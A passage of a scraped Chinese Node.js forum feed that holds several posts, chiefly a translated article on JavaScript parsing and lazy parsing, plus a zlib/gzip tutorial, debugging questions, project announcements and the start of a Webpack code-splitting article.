解析</h3>\n<p>让我们看看 AST 是如何构建的。我们用一个简单的 JavaScript 函数作为例子:</p>\n<pre class=\"prettyprint language-javascript\"><code>function foo(x) {\n    if (x &gt; 10) {\n        var a = 2;\n        return a * x;\n    }\n\n    return x + 10;\n}\n</code></pre><p>解析器会产生如下的 AST：</p>\n<p><img src=\"https://image.fundebug.com/2019-01-21-01.png\" alt></p>\n<p>注意，为了观看方便，这里是解析器将生成的结果的简化版本。实际的 AST 要复杂得多。然而，这里的目的是为了运行源码之前的第一个步骤前。如果人想查看实际的 AST 是什么样子，可以访问 <a href=\"https://astexplorer.net/\">AST Explorer</a>。它是一个在线工具，你以在其中输入一些 JavaScript 并输出对应的 AST。</p>\n<p>你可能会问，为什么需要知道 JavaScript解析器工作原理，毕竟这是浏览器工作，你想法是部分正确。下图展示了 JavaScript 执行过程中不同阶段的耗时。仔细瞅瞅，你或许会发现一些有趣的东西。</p>\n<p><img src=\"https://image.fundebug.com/2019-01-21-02.png\" alt></p>\n<p>发现没？ 通常情况下，浏览器解析 JavaScript 大约需占总执行时间的 <code>15%</code> 到 <code>20%</code>。我没有具体统计过这些数值。这些是来自真实应用程序和以某种方式使用 JavaScript 的网站的统计数据。也许 <code>15%</code> 看起来不是很多，但相信我，这是很多。</p>\n<p>一个典型的单页程序加载 0.4 mb 左右的 JavaScript，浏览器需要大约 <code>370ms</code> 来解析它。也许你会又说，这也不是很多嘛，本身花费的时间并不多。但请记住，这只是将 JavaScript 代码解析为 AST 所需要的时间。这并不包括运行本身的时间，也不包括在页面加载 ，如 CSS 和 HTML 渲染过程的耗时。这些还只涉及桌面，移动浏览器的情况会更加复杂，在手机上花在解析上的时间通常是桌面浏览器的 2 到 5 倍。</p>\n<p><img src=\"https://image.fundebug.com/2019-01-21-03.jpeg\" alt></p>\n<p>上图显示了 1MB JavaScript 包在不同类的移动和桌面浏览器解析时间。</p>\n<p>更重要的是，为了获得更多类原生的用户体验而把越来越多的业务逻辑堆积在前端，Web 应用程序正变得越来越复杂。你可以轻易地想到网络应用受到的性能影响。只需打开浏览器开发工具，然后使用该工具来解析、编译和浏览器中发生的所有其他事情上所消耗的时间。</p>\n<p><img src=\"https://image.fundebug.com/2019-01-21-04.jpeg\" alt></p>\n<p>不幸的是，移动浏览器上没有开发者工具。不过不用担心，这并不意味着你对此无能为力。因为有 <a href=\"https://github.com/danielmendel/DeviceTiming\">DeviceTiming</a> 工具,它可以用来帮助检测受控环境中脚本的解析和运行时间。它通过插入代码来封装本地代码，这样每次从不同的设备访问页面时，就可以在本地测量解析和运行时间。</p>\n<p>好事就是 JavaScript 引擎做了很多工作来避免冗余的工作，并得到了更好的优化，以下为主流浏览器使用的技术。</p>\n<p>例如，V8 实现脚本流(script streaming)和代码缓存技术。脚本流即脚本一旦开始下载，<code>async</code> 和 <code>deferred</code>的 脚本就会在单独的线程上解析。这意味着在下载脚本完成后几乎立即完成解析，这会提升 10% 的页面加载速度。</p>\n<p>每次访问页面时，JavaScript 代码通常编译为字节码。 然而，一旦用户访问另一页面，该字节码就被丢弃。 发生这种情况是因为编译后的代码很大程度上依赖于编译时机器的状态和上下文。 这是 Chrome 42 引入字节码缓存的原因。 该技术会本地缓存编译过的代码，这样当用户返回同一页面时，诸如下载，解析和编译等所有步骤都会被跳过。 这使得 Chrome 可以节省大约 40％ 的解析和编译时间。 此外，这还可以节省移动设备的电量。</p>\n<p>在 Opera 中，<a href=\"https://dev.opera.com/blog/carakan/\">Carakan</a> 引擎可以重用另一个程序最近编译过的输出。没有要求代码必须来自相同的页面甚至同个域下。这种缓存技术实际上非常高效，还可以完全跳过编译步骤。它依赖于典型的用户行为和浏览场景:每当用户在应用程序/网站中遵循某个用户的特定浏览习惯，都会加载相同的 JavaScript 代码。不过，Carakan 引擎早已被谷歌的 V8 所取代。</p>\n<blockquote>\n<p>Opera 新的 JavaScript 引擎 “Carakan”，目前速度是其他已存在 JavaScript 引擎（基于 SunSpider）的2.5倍。其在转化为本地机器代码时专门针对正则表达式做了优化。</p>\n</blockquote>\n<p>Firefox 使用的 <a href=\"https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey\">SpiderMonkey</a> 引擎不会缓存所有内容。它可以过渡到监视阶段，在这个阶段中，它计算执行给定脚本的次数。基于此计算，它推导出频繁使用而可以被优化的代码部分。</p>\n<blockquote>\n<p>SpiderMonkey 是 Mozilla 项目的一部分，是一个用 C 语言实现的 JavaScript 脚本引擎，另外还有一个叫做Rhino 的 Java 版本。</p>\n</blockquote>\n<p>显然，有些人决定什么都不做。Safari 的首席开发人员 <a href=\"https://en.wikipedia.org/wiki/Maciej_Stachowiak\">Maciej Stachowiak</a> 表示，Safari 不会对编译后的字节码进行任何缓存。缓存技术他们是有考虑过的问题，但是他们还没有实现，因为生成代码的耗时小于总运行时间的 2%。</p>\n<p>这些优化不会直接影响 JavaScript 源代码的解析，但是会尽可能完全避免。毕竟做总比没做好点？</p>\n<p>我们可以做很多事情来改善应用程序的初始加载时间。最小化加载的 JavaScript 数量：代码越小、解析所需要时间就越少，运行时间也就越小。要做到这一点，我们只能在当前的路由上加载所需的代码，而不是加载一大陀的代码。例如，<a href=\"https://developers.google.com/web/fundamentals/performance/prpl-pattern/\">PRPL模式</a>即表示该种代码传输类型。或者，可以检查代码的依赖关系，看看是否有什么冗余的依赖导致代码库膨胀，然而，这些东西需要很大的篇幅来进行讨论。</p>\n<p>本文的主要的目的讨论作为 Web 开发人员可以做些什么来帮助 JavaScript 解析器更快地完成它的工作。还有,现代JavaScript 解析器使用 <strong>启发法(heuristics)</strong> 来决定是否立即运行指定的代码片段或者推迟在未来的某个时候运行。基于这些启发法，解析器将进行即时或懒解析。</p>\n<blockquote>\n<p>启发法是针对模型求解方法而言的，是一种逐次逼近最优解的方法。这种方法对所求得的解进行反复判断实践修正直至满意为止。启发法的特点是模型简单，需要进行方案组合的个数少，因此便于找出最终答案。此方法虽不能保证得到最优解，但只要处理得当，可获得决策者满意的近似最优解。一般步骤包括:定义一个计算总费用的方法;报定判别准则;规定方案改选的途径;建立相应的模型;送代求解。</p>\n</blockquote>\n<p>立即解析会运行需要立即编译的函数。它主要做三件事:构建 AST，构建作用域层级和查找所有语法错误。另一方面， 懒解析只运行未编译的函数。它不构建AST，也不查找所有语法错误，它只构建作用域层级，与立即解析相比节省了大约一半的时间。</p>\n<p>显然，这不是一个新概念。即使像 IE 9 这样的浏览器也支持这种类型的优化，尽管与现在的解析器的工作方式相比，这种优化方式还很初级。</p>\n<p>来看一个例子，假设有以下代码片段:</p>\n<pre class=\"prettyprint language-javascript\"><code>function foo() {\n    function bar(x) {\n        return x + 10;\n    }\n\n    function baz(x, y) {\n        return x + y;\n    }\n\n    console.log(baz(100, 200));\n}\n\nfoo()\n</code></pre><p>就像前面的例子一样，代码被输入到语法分析器中，语法分析器进行语法分析并输出AST，如下：</p>\n<ul>\n<li>声明函数 <code>foo</code></li>\n<li>调用函数 <code>foo</code></li>\n<li>在 <code>foo</code> 里声明函数 <code>bar</code> 接收参数 <code>x</code>, 并返回 <code>x</code> 和 10 相加的结果</li>\n<li>在 <code>foo</code> 里声明函数 <code>baz</code> 接收参数 <code>x</code>和 <code>y</code>, 并返回 <code>x</code> 和 <code>y</code> 相加的结果</li>\n<li>调用 <code>baz</code> 函数传入 100 和 2。</li>\n<li>调用 <code>console.log</code> 参数为之前函数调用的返回值。</li>\n</ul>\n<p><img src=\"https://image.fundebug.com/2019-01-21-05.png\" alt></p>\n<p>那么期间发生了什么? 解析器看到 <code>bar</code> 函数的声明、<code>baz</code> 函数的声明、<code>bar</code>函数的调用和 <code>console.log</code> 的调用。但是，解析器做了一些完全无关的额外工作即解析 <code>bar</code> 函数。为什么这无关紧要? 因为函数 <code>bar</code> 从来没有被调用过(或者至少在那个时候没有)。这是一个简单的示例，看起来可能有些不同寻常，但在许多实际应用程序中，许多声明的函数从未被调用。</p>\n<p>这里不解析<code>bar</code>函数，该函数声明了却没有调用它。只在需要的时候在函数运行前进行真正的解析。懒解析仍然需要找到函数的整个主体并为其声明，但仅此而已。它不需要语法树，因为它还没有被处理。另外，它不会从堆中分配内存，而堆通常会占用相当多的系统资源，简而言之，跳过这些步骤会带来很大的性能改进。</p>\n<p>所以之前的例子，解析器实际上会像如下这样解析：</p>\n<p><img src=\"https://image.fundebug.com/2019-01-21-06.png\" alt></p>\n<p>注意，这里只确认 <code>bar</code> 函数声明，没有进入 <code>bar</code> 函数体。在这种情况下，函数体只是一个返回语句。但是，与大多数实际应用程序一样，它可以更大，包含多个返回语句、条件语句、循环、变量声明，甚至嵌套函数声明。这完全是在浪费时间和系统资源，因为这个函数永远不会被调用。</p>\n<p>这是一个相当简单的概念，但实际上，它的实现是非常难的，不局限于以上示例。整个方法还可以适用于函数、循环、条件、对象等。基本上，所有需要解析的东西。</p>\n<p>例如，下面是一个非常常见的 JavaScript 模式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var myModule = (function() {\n     &#x2F;&#x2F; 整个模块的逻辑\n     &#x2F;&#x2F; 返回模块对象\n})();\n</code></pre><p>大多数现代 JavaScript 解析器都能识别这种模式，此模式表示代码需要立即解析。</p>\n<p>那么为什么解析器不都使用懒解析呢? 如果懒解析某些代码，这些代码需要立即执行，这实际上会使代码运行速度变慢。需要运行一次懒解析之后进行另一个立即解析，这和立即解析相比，运行速度会慢 50%。</p>\n<p>现在对解析器底层原理有了大致的了解，是时候考虑如何提高解析器的解析速度。可以用这种方式编写代码，以便在正确的时间解析函数。大多数解析器都能识别一种模式:使用括号封装函数。对于解析器来说，这几乎总是一个积极的信号，即函数需要立即执行。如果解析器看到一个左括号，紧接着是一个函数声明，它将立即解析这个函数。可以通过显式地声明立即执行的函数来帮助解析器加快解析速度。</p>\n<p>假设有一个名为 <code>foo</code> 的函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function foo(x) {\n    return x * 10;\n}\n</code></pre><p>因为没有明显地标识表明需要立即运行该函数所以浏览器会进行懒解析。然而，我们确定这是不对的，那么可以运行两个步骤。</p>\n<p>首先，将函数存储在一个变量中:</p>\n<pre class=\"prettyprint language-javascript\"><code>var foo = function foo(x) {\n    return x * 10;\n};\n</code></pre><p>注意，这里有使用函数的名称 <code>foo</code>,这不是必需的，但是建议这样做，因为在抛出异常的情况下，stacktrace 会保留实际函数名称，而不仅仅是 <code>&lt;anonymous&gt;</code>。</p>\n<p>以上事例解析器执行懒解析，可以用括号封装起来，让解析器进行立即解析：</p>\n<pre class=\"prettyprint language-javascript\"><code>var foo = (function foo(x) {\n    return x * 10;\n});\n</code></pre><p>现在，解析器看见 <code>function</code> 关键字前的左括号便会立即进行解析。</p>\n<p>因为需要知道解析器在哪些情况下执行懒解析或者立即解析，所以很难手动管理。此外，还需要花时间考虑是否立即调用某个函数，肯定没人想这么做的。</p>\n<p>最后，这种地让代码更难阅读和理解。可以使用 <code>Optimize.js</code> 可以帮我们做这类事情，该工具只是用来优化 JavaScript 源代码的初始加载时间，它们对代码进行静态分析，然后通过使用括号封装需要立即运行的函数以便浏览器立即解析并准备运行它们。</p>\n<p>像往常一样编码，然后有一段代码看起来像这样的：</p>\n<pre class=\"prettyprint language-javascript\"><code>(function() {\n    console.log(&#x27;Hello, World!&#x27;);\n})();\n</code></pre><p>一切看起来都很好，如预期的那样工作，而且速度很快，因为在函数声明之前添加左括号。当然，在进入生产环境之前需要进行代码压缩，以下为压缩工具的输出：</p>\n<pre class=\"prettyprint language-javascript\"><code>!function(){console.log(&#x27;Hello, World!&#x27;)}();\n</code></pre><p>好像没问题，代码像以前一样工作。但是好像少了什么，压缩工具删除包裹函数的括号，而是在函数前放置了一个感叹号，这意味着解析器将跳过此并将执行惰解析。</p>\n<p>最重要的是，为了能够执行该函数，它将在懒解析之后立即进行立即解析。 这会使代码运行得更慢，幸运的是，可以利用 <code>Optimize.js</code> 来解决此类问题，传给 <code>Optimize.js</code> 压缩过的代码会输出如下代码：</p>\n<pre class=\"prettyprint language-javascript\"><code>!(function(){console.log(&#x27;Hello, World!&#x27;)})();\n\n</code></pre><p>这还差不多，现在拥有两全其美方案：压缩代码且解析器正确地识别懒解析和立即解析的函数。</p>\n<h3>预编译</h3>\n<p>但为什么不能在服务器端完成所有这些工作呢？ 毕竟，最好这样做一次并将结果提供给客户端，而不强制各个客户端重复做该项事情。那么，目前正在讨论引擎是否应该提供一种执行预编译脚本的方法，这样就可以节省浏览器运行时间。</p>\n<p>从本质上讲，该思路是拥有可以生成字节码的务器端工具，这样只需要传输字节码并在客户端运行，之后会看到启动时间的一些主要差异。 这可能听起来很诱人，但事情并非那么简单，还可能会产生相反的效果，因为它会更大，并且很可能需要签署代码并出于安全原因对其进行处理。 例如，V8 团队正在努力解决重复解析问题，这样预编译有可能实际并没有多大的用处。</p>\n<h3>提升编译速度一些建议</h3>\n<ul>\n<li>检查依赖，减少不必要的依赖</li>\n<li>分割代码为更小的块而不是一整陀的</li>\n<li>尽可能推迟加载 JavaScript，按需要加载或者动态加载。</li>\n<li>使用开发者工具和 DeviceTiming 来检测性能瓶颈</li>\n<li>用像 Optimize.js 的工具来帮助解析器选择立即解析或者懒解析以加快解析速度</li>\n</ul>\n<p><strong>原文：<a href=\"https://blog.sessionstack.com/how-javascript-works-parsing-abstract-syntax-trees-asts-5-tips-on-how-to-minimize-parse-time-abfcf7e8a0c8\">How JavaScript works: Parsing, Abstract Syntax Trees (ASTs) + 5 tips on how to minimize parse time</a></strong></p>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了9亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家<a href=\"https://www.fundebug.com/team/create\">免费试用</a>！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n</div>","title":"JavaScript的工作原理：解析、抽象语法树（AST）+ 提升编译速度5个技巧","last_reply_at":"2019-03-05T07:28:42.189Z","good":true,"top":false,"reply_count":10,"visit_count":3148,"create_at":"2019-01-22T01:45:02.116Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c78d55b5b8cb21491ca4e83","author_id":"55b5d4dd0b2974890124e506","tab":"ask","content":"<div class=\"markdown-text\"><p>node  v8.11.2\nchrome 72</p>\n<p>执行  npm run debug  会有下面的信息\nDebugger listening on ws://127.0.0.1:9229/4ec2286c-4b7b-4079-8cf1-2e85975ebdd6\nFor help see <a href=\"https://nodejs.org/en/docs/inspector\">https://nodejs.org/en/docs/inspector</a>\n[egg-ts-helper] create D:\\wt\\egg\\egg-example\\typings\\app\\controller\\index.d.ts\n[egg-ts-helper] create D:\\wt\\egg\\egg-example\\typings\\config\\index.d.ts\n[egg-ts-helper] create D:\\wt\\egg\\egg-example\\typings\\app\\service\\index.d.ts\n[egg-ts-helper] create D:\\wt\\egg\\egg-example\\typings\\app\\index.d.ts\n2019-03-01 14:35:46,103 INFO 15252 [master] node version v8.11.2\n2019-03-01 14:35:46,105 INFO 15252 [master] egg version 2.18.0\nDebugger listening on ws://127.0.0.1:5800/7be28063-ec07-4f03-be3e-060c3b936d85\nFor help see <a href=\"https://nodejs.org/en/docs/inspector\">https://nodejs.org/en/docs/inspector</a>\n2019-03-01 14:35:51,559 INFO 15252 [master] agent_worker#1:14396 started (5448ms)\nDebugger listening on ws://127.0.0.1:9230/6c14b5a8-d338-4ae0-9b64-370403ab5e82\nFor help see <a href=\"https://nodejs.org/en/docs/inspector\">https://nodejs.org/en/docs/inspector</a>\n9230 opened\nDebug Proxy online, now you could attach to 9999 without worry about reload.\nDevTools → chrome-devtools://devtools/bundled/inspector.html?experiments=true&amp;v8only=true&amp;ws=127.0.0.1:9999/<strong>ws_proxy</strong>\n2019-03-01 14:35:58,127 INFO 15252 [master] egg started on <a href=\"http://127.0.0.1:7001\">http://127.0.0.1:7001</a> (12021ms)</p>\n<p>在chrome 里面 打开 chrome://inspect/#devices\nTarget discovery settings  设置了下面几个\nlocalhost:9222\nlocalhost:9229\nlocalhost:9999\nlocalhost:7001</p>\n<p>然后我在chrome里面访问的 <a href=\"http://localhost:7001\">http://localhost:7001</a>\n在chrome://inspect/#devices的界面如下\n<img src=\"//static.cnodejs.org/FvgeJOwR7hhyoPQWDMikj5kIIkKM\" alt=\"1.png\">\n点击inspect   没有file://这个\n<img src=\"//static.cnodejs.org/Fmzkl7kR6LwrqqLev29MchHVvr4w\" alt=\"2.png\"></p>\n</div>","title":"egg debug 总是不成功","last_reply_at":"2019-03-05T04:19:49.248Z","good":false,"top":false,"reply_count":3,"visit_count":564,"create_at":"2019-03-01T06:46:51.413Z","author":{"loginname":"wtcsy","avatar_url":"https://avatars2.githubusercontent.com/u/7374706?v=4&s=120"}},{"id":"5c7df7105b8cb21491ca5fe5","author_id":"550973933135610a365b01fa","tab":"share","content":"<div class=\"markdown-text\"><p>不知大家还记得去年我发的一个<a href=\"https://cnodejs.org/topic/5c0620c4d3b8ab334e8da79e\">帖子</a>吗？当时有了想法后，马上开始构建的一个全新的状态管理框架,我把它命名为react-control-center，随着这几个月的精心打磨，已经成长为了我最初想象的模样，也开始服务于公司的内部产品了，突然一想，后续还有好多好多改进的todo事项，</p>\n<ul>\n<li>减小包体，</li>\n<li>完成在线文档，</li>\n<li>写完index.d.ts，</li>\n<li>基于cc的中间件机制，写一个chrome 插件类似redux-dev-tool,利用immutablejs冻结state，实现状态变化过程追溯</li>\n<li>写一个cc-react-router, 把react-router整合到cc里</li>\n<li>etc</li>\n</ul>\n<hr>\n<p>至少我勇敢的迈出了第一步，期待更多的人，认识cc，基于cc的灵活且强大的api总结出自己的最佳实践，并爱上cc.\n为了让更多的初学者了解cc是什么，我写了一个在线的counter，期待你以此打开通往cc世界的大门:\n<a href=\"https://stackblitz.com/edit/dva-example-count-1saxx8\">性感的counter</a></p>\n</div>","title":"react-control-center, 最终成长为了我脑海里想象的模样","last_reply_at":"2019-03-05T04:12:00.440Z","good":false,"top":false,"reply_count":0,"visit_count":376,"create_at":"2019-03-05T04:12:00.440Z","author":{"loginname":"fantasticsoul","avatar_url":"https://avatars0.githubusercontent.com/u/7334950?v=4&s=120"}},{"id":"5c7ddd3d5b8cb21491ca5e22","author_id":"52cce7827a15a38466a94b4b","tab":"share","content":"<div class=\"markdown-text\"><p>做宝爸快一年了，自然会花一些精力调整知识结构，关注婴幼儿成长方面的知识，现在的宝宝在营养方面普遍处于过剩状态，身边越来越常见到那种明显“富态”的宝宝，对于孩子何谓胖何谓瘦众说纷纭。</p>\n<p>为了有一个权威可靠的标准去衡量孩子的生长健康状况，我查了世界卫生组织提供的婴幼儿成长标准，标准以天为单位，提供 5 岁以内婴幼儿的身高、体重、BMI （衡量胖瘦）等指标的分布占比信息，也就是说任意天数的宝宝都能查到当下最符合健康成长规律的身高、体重、BMI 数值，也可以查到宝宝当前的成长数据处于整体样本库中的什么位置，以此衡量宝宝的成长状态，辅助纠正宝宝的喂养问题。</p>\n<p>经过一个周的开发，目前初代版本已上线，欢迎扫码体验。</p>\n<p><img src=\"//static.cnodejs.org/FlHOQHo_aogCCCAeJ6C_gxF7H0c8\" alt=\"扫码_搜索联合传播样式-标准色版.png\"></p>\n</div>","title":"为了知道孩子胖不胖，我做了一个《成长助理》小程序","last_reply_at":"2019-03-05T02:21:49.525Z","good":false,"top":false,"reply_count":0,"visit_count":583,"create_at":"2019-03-05T02:21:49.525Z","author":{"loginname":"tower1229","avatar_url":"https://avatars1.githubusercontent.com/u/4016839?v=4&s=120"}},{"id":"5c6cfdf5e1a81129a7ad8b7f","author_id":"5c663d23f53f161dbaeb3de4","tab":"ask","content":"<div class=\"markdown-text\"><p><strong>是《Nodejs in action》这本书吗</strong></p>\n<h4>新手求入门书籍和进阶书籍</h4>\n<blockquote>\n<p>先找到对的书， 然后拜读不是吗</p>\n</blockquote>\n<p><strong><em>求一下中文版pdf链接</em></strong></p>\n</div>","title":"狼叔说的 把《node in action》看五遍， 然后去写代码,  是认真的吗","last_reply_at":"2019-03-04T23:49:14.554Z","good":false,"top":false,"reply_count":26,"visit_count":3007,"create_at":"2019-02-20T07:12:53.928Z","author":{"loginname":"nelhu","avatar_url":"https://avatars3.githubusercontent.com/u/24311105?v=4&s=120"}},{"id":"532269f4d7ede09c72000a88","author_id":"4efc278625fa69ac690003c8","content":"<div class=\"markdown-text\"><p>为了减少网络传输数据量，http传输过程中会采用通用的压缩算法来压缩数据，gzip属于最常用的压缩算法。</p>\n<p>使用node的http模块发送请求时并没有帮我们进行解压，因此我们需要手动去判断gzip。</p>\n<pre class=\"prettyprint\"><code>var http = require(&#x27;http&#x27;);\nvar options = {\n hostname: &#x27;www.qq.com&#x27;,\n port: 80,\n method: &#x27;get&#x27;,\n headers: {\n  &#x27;Accept-Encoding&#x27;: &#x27;gzip&#x27;\n }\n}\n\nhttp.request(options, handler);\n\nfunction handler(responder) {\n &#x2F;&#x2F; do something\n}\n</code></pre><p>我们设置http头Accept-Encoding为gzip告诉服务器我们支持gzip压缩，服务器收到请求后，返回responder头中content-encoding带有gzip表明返回的数据为gzip压缩过的内容，node中可以通过responder.headers[‘content-encoding’]来判断服务器返回内容是否gzip压缩过。</p>\n<pre class=\"prettyprint\"><code>function handler(responder) {\n if(responder.headers[&#x27;content-encoding&#x27;].indexOf(&#x27;gzip&#x27;) != -1) {\n  &#x2F;&#x2F; 解压gzip\n }\n}\n\n</code></pre><p>已经可以判断服务器返回的是gzip压缩过的内容，接下来我们需要去解压，幸好node提供了zlib模块。</p>\n<p>我们用zlib模块来解压gzip</p>\n<pre class=\"prettyprint\"><code>var zlib = require(&#x27;zlib&#x27;);\nvar fs = require(&#x27;fs&#x27;);\nvar gunzipStream = zlib.createGunzip();\nvar toWrite = fs.createWriteStream(&#x27;qq.html&#x27;);\n</code></pre><p>zlib.createGunzip是一个transform流，通过pipe我们可以很方便解压gzip</p>\n<pre class=\"prettyprint\"><code>function handler(responder) {\n if(responder.headers[&#x27;content-encoding&#x27;].indexOf(&#x27;gzip&#x27;) != -1) {\n  responder.pipe(gunzipStream).pipe(toWrite);\n }\n}\n</code></pre><p>若是要让服务端支持gzip压缩可以先判断请求头的accept-encoding是否含有gzip</p>\n<pre class=\"prettyprint\"><code>var fs = require(&#x27;fs&#x27;);\nvar http = require(&#x27;http&#x27;);\nvar zlib = require(&#x27;zlib&#x27;);\n\nhttp.createServer(function(req, res) {\n var file = fs.createReadStream(&#x27;.&#x2F;qq.html&#x27;);\n var acceptEncoding = req.headers[&#x27;accept-encoding&#x27;];\n if(acceptEncoding &amp;&amp; acceptEncoding.indexOf(&#x27;gzip&#x27;) != -1) {\n  var gzipStream = zlib.createGzip();\n  &#x2F;&#x2F; 设置返回头content-encoding为gzip\n  res.writeHead(200, {\n   &quot;content-encoding&quot;: &quot;gzip&quot;\n  });\n  file.pipe(gzipStream).pipe(res);\n } else {\n  res.writeHead(200);\n  &#x2F;&#x2F; 不压缩\n  file.pipe(res);\n }\n}).listen(8080);\n\n</code></pre><p>使用curl测试一下</p>\n<pre class=\"prettyprint\"><code># 不带有Accept-Encoding:gzip 返回正常文本\ncurl localhost:8080\n# 带Accept-Encoding:gzip 返回压缩过的文件\ncurl -H &quot;Accept-Encoding:gzip&quot; localhost:8080\n</code></pre><p>通过zlib可以实现客户端和服务端对gzip的压缩和解压</p>\n<p>在express中提供了compress的中间件用来处理gzip</p>\n<p>引用自 <a href=\"http://wyicwx.github.io/2014/03/13/node%E4%B8%AD%E7%94%A8zlib%E8%A7%A3%E5%8E%8Bgzip/\">nodejs中用zlib解压gzip</a></p>\n</div>","title":"nodejs中用zlib解压gzip","last_reply_at":"2019-03-04T11:20:14.339Z","good":false,"top":false,"reply_count":3,"visit_count":28395,"create_at":"2014-03-14T02:31:16.987Z","author":{"loginname":"xiaofeng748","avatar_url":"//gravatar.com/avatar/2308e232773916bebc0d468266296b6f?s=48"}},{"id":"5c1f043f76c4964062a1ca84","author_id":"58130d10b37ee8fb339788cf","tab":"ask","content":"<div class=\"markdown-text\"><h2>当然不！</h2>\n<p>但是你了解【<a href=\"https://www.aliyun.com/product/ots\">表格存储（TableStore）</a>】吗?</p>\n<p>这里为大家介绍一款<strong>PB量级的NoSQL</strong>：表格存储（TableStore，原名OTS）是<strong>阿里云自研分布式多模型NoSQL数据库</strong>，支持多种数据模型（包含宽行、消息、时序、时空等），满足不同应用场景的需求。</p>\n<p>TableStore是基于共享存储的<strong>高性能、低成本、易扩展、全托管的半结构化数据存储平台</strong>，支撑互联网和物联网数据的高效计算与分析。</p>\n<h1>看一看如何轻松：</h1>\n<h2>打造《<strong>亿量级</strong>订单系统》：</h2>\n<p><a href=\"https://ots.console.aliyun.com/index#/demo/cn-hangzhou/order\">样例：</a><a href=\"https://ots.console.aliyun.com/index#/demo/cn-hangzhou/order\">https://ots.console.aliyun.com/index#/demo/cn-hangzhou/order</a>\n<a href=\"https://cnodejs.org/topic/5c35fcdd3898674067a7d53d\">文章：</a><a href=\"https://cnodejs.org/topic/5c35fcdd3898674067a7d53d\">https://cnodejs.org/topic/5c35fcdd3898674067a7d53d</a></p>\n<h2>打造《<strong>亿量级</strong>店铺搜索》：</h2>\n<p><a href=\"https://ots.console.aliyun.com/index#/demo/cn-hangzhou/geo\">样例：</a><a href=\"https://ots.console.aliyun.com/index#/demo/cn-hangzhou/geo\">https://ots.console.aliyun.com/index#/demo/cn-hangzhou/geo</a>\n<a href=\"https://cnodejs.org/topic/5c3c781f3898674067a7f10e\">文章：</a><a href=\"https://cnodejs.org/topic/5c3c781f3898674067a7f10e\">https://cnodejs.org/topic/5c3c781f3898674067a7f10e</a></p>\n<p><img src=\"//static.cnodejs.org/Fmun03yK3aj-SdLF8aq651sHxX1b\" alt=\"image.png\"></p>\n<p>======\n大家来说说，node用户为什么比较热衷mongodb？</p>\n</div>","title":"node用户只会使用mongodb吗？","last_reply_at":"2019-03-04T09:14:01.930Z","good":false,"top":false,"reply_count":14,"visit_count":1928,"create_at":"2018-12-23T03:42:55.445Z","author":{"loginname":"wangtantan","avatar_url":"https://avatars1.githubusercontent.com/u/16631445?v=4&s=120"}},{"id":"5c78ad965b8cb21491ca4d1a","author_id":"5907703b5bb7efe417431f27","tab":"ask","content":"<div class=\"markdown-text\"><p>就像 <a href=\"https://play.golang.org/\">https://play.golang.org/</a> 这样的，如何实现出来</p>\n</div>","title":"如何制做在线编译代码的网站？","last_reply_at":"2019-03-04T09:04:39.845Z","good":false,"top":false,"reply_count":6,"visit_count":777,"create_at":"2019-03-01T03:57:10.387Z","author":{"loginname":"chanywn","avatar_url":"https://avatars1.githubusercontent.com/u/28001537?v=4&s=120"}},{"id":"5c7c8afc90c14711cc8c9dc7","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>摘要：</strong> Webpack骚操作。</p>\n<ul>\n<li>原文：<a href=\"https://segmentfault.com/a/1190000018368885\">Web 性能优化： 使用 Webpack 分离数据的正确方法</a></li>\n<li>作者：<a href=\"https://segmentfault.com/a/1190000017794020\">前端小智</a></li>\n</ul>\n<p><strong><a href=\"https://www.fundebug.com/\">Fundebug</a>经授权转载，版权归原作者所有。</strong></p>\n<p>制定向用户提供文件的最佳方式可能是一项棘手的工作。 有很多不同的场景，不同的技术，不同的术语。</p>\n<p>在这篇文章中，我希望给你所有你需要的东西，这样你就可以:</p>\n<ol>\n<li>了解哪种文件分割策略最适合你的网站和用户</li>\n<li>知道怎么做</li>\n</ol>\n<p>根据 <a href=\"https://webpack.js.org/glossary/\">Webpack glossary</a>，有两种不同类型的文件分割。 这些术语听起来可以互换，但显然不是。</p>\n<p>Webpack 文件分离包括两个部分，一个是 Bundle splitting，一个是 Code splitting:</p>\n<ul>\n<li><strong>Bundle splitting</strong>: 创建更多更小的文件，并行加载，以获得更好的缓存效果，主要作用就是使浏览器并行下载，提高下载速度。并且运用浏览器缓存，只有代码被修改，文件名中的哈希值改变了才会去再次加载。</li>\n<li><strong>Code splitting</strong>：只加载用户最需要的部分，其余的代码都遵从懒加载的策略，主要的作用就是加快页面的加载速度，不加载不必要的代码。</li>\n</ul>\n<p>第二个听起来更吸引人，不是吗?事实上，关于这个问题的许多文章似乎都假设这是制作更小的JavaScript 文件的惟一值得的情况。</p>\n<p>但我在这里要告诉你的是，第一个在很多网站上都更有价值，应该是你为所有网站做的第一件事。</p>\n<p>就让我们一探究竟吧。</p>\n<h3>Bundle splitting</h3>\n<p>bundle splitting 背后的思想非常简单，如果你有一个巨大的文件，并且更改了一行代码，那么用户必须再次下载整个文件。但是如果将其分成两个文件，那么用户只需要下载更改的文件，浏览器将从缓存中提供另一个文件。</p>\n<p>值得注意的是，由于 bundle splitting 都是关于缓存的，所以对于第一次访问来说没有什么区别。</p>\n<p>(我认为太多关于性能的讨论都是关于第一次访问一个站点，或许部分原因是“第一印象很重要”，部分原因是它很好、很容易衡量。</p>\n<p>对于经常访问的用户来说，量化性能增强所带来的影响可能比较棘手，但是我们必须进行量化!</p>\n<p>这将需要一个电子表格，因此我们需要锁定一组非常特定的环境，我们可以针对这些环境测试每个缓存策略。</p>\n<p>这是我在前一段中提到的情况:</p>\n<ul>\n<li>Alice 每周访问我们的网站一次，持续 10 周</li>\n<li>我们每周更新一次网站</li>\n<li>我们每周都会更新我们的“产品列表”页面</li>\n<li>我们也有一个“产品详细信息”页面，但我们目前还没有开发</li>\n<li>在第 5 周，我们向站点添加了一个新的 npm 包</li>\n<li>在第 8 周，我们更新了一个现有的 npm 